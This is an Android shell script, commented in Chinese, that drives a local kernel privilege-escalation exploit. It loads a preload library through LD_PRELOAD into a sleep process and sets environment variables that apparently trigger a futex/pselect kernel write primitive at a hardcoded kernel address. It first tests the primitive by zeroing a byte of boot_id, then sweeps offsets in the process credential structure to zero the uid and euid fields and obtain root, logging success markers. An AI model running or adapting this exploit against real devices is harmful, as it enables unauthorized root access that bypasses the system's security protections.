#!/system/bin/sh
# mt46 P0-A: 一次实验裁决三件事 — cred 身份 / uid 偏移 / 零写原语在 cred 上落地
#
# 纪律（沿用 mt25/26 已验证配方）:
#   - 每轮独立进程（规避进程内重试毒化 → mt44 的 trigger-110）
#   - PSELECT_RETRY=1，窗口由 PSELECT_UID_WIN 按轮指定
#   - am kill-all 恢复喷页 cache
#
# 轮次设计:
#   round 0  : 判活 oracle（非 CRED 路径，写 boot_id 首字节 → 00 可观测）
#   round 1-8: CRED 路径，窗口轮扫 4 / 14 / 1c / 24 × 2 遍
#     0x04 → 零写 uid+gid      （getuid/getgid 变 0 → CHILD-ROOT）
#     0x14 → 零写 euid+egid    （geteuid/getegid 变 0 → CHILD-ROOT）
#     0x1c → 零写 fsuid+fsgid  （对照组之一，六个 id 里不可见 → 无 CHILD-ROOT）
#     0x24 → 零写 securebits+cap_inheritable.lo（纯对照，无可见变化）
#
# 结果判读:
#   R0 boot_id 变 + 某 cred 轮 CHILD-ROOT → P0-A 成功：uid@+0x4 铁证 + 零写原语在 cred 落地
#   R0 boot_id 变 + 8 轮全灭              → CRED 路径触发问题（fork/perf 扰动悬垂链），下一步查 trigger
#   R0 boot_id 不变                       → 本 boot 写原语未激活（slab 状态差），换 boot 重跑

SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt46.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt46_p0a.txt
RUNLOG=/data/local/tmp/mt46_run.out
rm -f $DST; cp $SRC $DST; sync

BID0=$(cat /proc/sys/kernel/random/boot_id)
rm -f /data/local/tmp/root_marker.txt /data/local/tmp/root_shell.txt
echo "start $(date +%H:%M:%S) boot_before=$BID0" > $LOG
am kill-all 2>&1 | tail -1 >> $LOG

echo "=== ROUND 0: liveness oracle (boot_id) ===" >> $LOG
rm -f $RUNLOG
timeout 150 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_RETRY=1 \
  PSELECT_TREE_PC=ffffff8002a60bb0 \
  PSELECT_TREE_LEFT=0 \
  LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
echo "round0 rc=$?" >> $LOG
grep -a 'WRITE PRIMITIVE\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
BID=$(cat /proc/sys/kernel/random/boot_id)
echo "round0 boot_id=$BID" >> $LOG
if [ "$BID" = "$BID0" ]; then
  echo "!! round0: primitive NOT alive this boot — 后续轮大概率也灭，建议直接换 boot 重跑" >> $LOG
fi
sleep 3

echo "=== ROUNDS 1-8: cred uid-window rotation ===" >> $LOG
WINS="4 14 1c 24 4 14 1c 24"
R=0
for W in $WINS; do
  R=$((R+1))
  echo "--- round $R window=$W start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 150 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_UID_WIN=$W \
    LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
  echo "round=$R win=$W rc=$?" >> $LOG
  grep -a 'mt46:\|mt40:\|mt33:\|CHILD-ROOT\|ROOT MARKER\|futex trigger\|SLIDE page\|cred_addr' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  if grep -aq 'CHILD-ROOT' $RUNLOG; then
    echo "★★★ ROUND $R WIN=$W CHILD-ROOT ★★★" >> $LOG
    break
  fi
  if [ -f /data/local/tmp/root_marker.txt ]; then
    echo "★★★ ROUND $R WIN=$W ROOT MARKER: $(cat /data/local/tmp/root_marker.txt) ★★★" >> $LOG
    break
  fi
  sleep 3
done

echo "=== uid=$(id -u 2>/dev/null) enforce=$(getenforce 2>/dev/null) ===" >> $LOG
echo "=== DONE $(date +%H:%M:%S) ===" >> $LOG
